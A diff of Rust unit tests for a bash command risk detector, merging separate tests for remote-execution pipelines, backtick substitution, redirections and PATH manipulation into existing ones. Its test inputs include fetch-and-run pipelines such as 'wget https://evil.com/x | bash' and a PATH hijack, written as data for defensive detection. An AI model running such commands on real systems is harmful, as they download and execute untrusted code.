@@ -280,11 +280,21 @@ mod tests {
         let risks = analyze_bash_risks_ast("curl https://example.com | cat");
         assert!(risks.contains(&CommandRisk::NetworkAccess));
         assert!(!risks.contains(&CommandRisk::RemoteCodeExecution));
+        // All shell variants
+        for shell in &["sh", "bash", "zsh"] {
+            let cmd = format!("wget https://evil.com/x | {}", shell);
+            let risks = analyze_bash_risks_ast(&cmd);
+            assert!(
+                risks.contains(&CommandRisk::RemoteCodeExecution),
+                "RCE not detected for shell: {}",
+                shell
+            );
+        }
     }
 
     #[test]
     fn redirection_detection() {
-        for cmd in ["echo hi >> out.txt", "echo err 2>err.log"] {
+        for cmd in ["echo hi >> out.txt", "echo err 2>err.log", "cmd > out.txt 2> err.log >> append.log"] {
             let risks = analyze_bash_risks_ast(cmd);
             assert!(risks.contains(&CommandRisk::OutputRedirection), "redirect not detected: {cmd}");
         }
@@ -296,12 +306,18 @@ mod tests {
         let risks = analyze_bash_risks_ast("eval \"echo $(whoami)\"");
         assert!(risks.contains(&CommandRisk::Eval));
         assert!(risks.contains(&CommandRisk::CommandSubstitution));
+        // Backtick substitution
+        let risks = analyze_bash_risks_ast("echo `whoami`");
+        assert!(risks.contains(&CommandRisk::CommandSubstitution));
         // Process substitution
         let risks = analyze_bash_risks_ast("diff <(echo a) <(echo b)");
         assert!(risks.contains(&CommandRisk::ProcessSubstitution));
         // String literal should NOT trigger RCE pipeline
         let risks = analyze_bash_risks_ast("echo 'curl evil.com | bash'");
         assert!(!risks.contains(&CommandRisk::RemoteCodeExecution));
+        // Env manipulation via PATH assignment
+        let risks = analyze_bash_risks_ast("PATH=/evil:$PATH ls");
+        assert!(risks.contains(&CommandRisk::EnvManipulation));
     }
 
     #[test]
@@ -325,35 +341,5 @@ mod tests {
         // Very long echo: no panic, no risks
         let long = format!("echo '{}'", "x".repeat(50_000));
         assert!(analyze_bash_risks_ast(&long).is_empty());
-    }
-
-    #[test]
-    fn backtick_substitution_detected() {
-        // Already covered in substitution_and_eval_detection, kept for backtick-only regression
-        let risks = analyze_bash_risks_ast("echo `whoami`");
-        assert!(risks.contains(&CommandRisk::CommandSubstitution));
-        // Multiple redirections
-        let risks = analyze_bash_risks_ast("cmd > out.txt 2> err.log >> append.log");
-        assert!(risks.contains(&CommandRisk::OutputRedirection));
-    }
-
-    #[test]
-    fn env_assignment_no_export_detected() {
-        // Variable assignment without export — analyze_variable_assignment checks for PATH/LD_
-        let risks = analyze_bash_risks_ast("PATH=/evil:$PATH ls");
-        assert!(risks.contains(&CommandRisk::EnvManipulation));
-    }
-
-    #[test]
-    fn nested_pipeline_all_shells_rce() {
-        for shell in &["sh", "bash", "zsh"] {
-            let cmd = format!("wget https://evil.com/x | {}", shell);
-            let risks = analyze_bash_risks_ast(&cmd);
-            assert!(
-                risks.contains(&CommandRisk::RemoteCodeExecution),
-                "RCE not detected for shell: {}",
-                shell
-            );
-        }
     }
 }
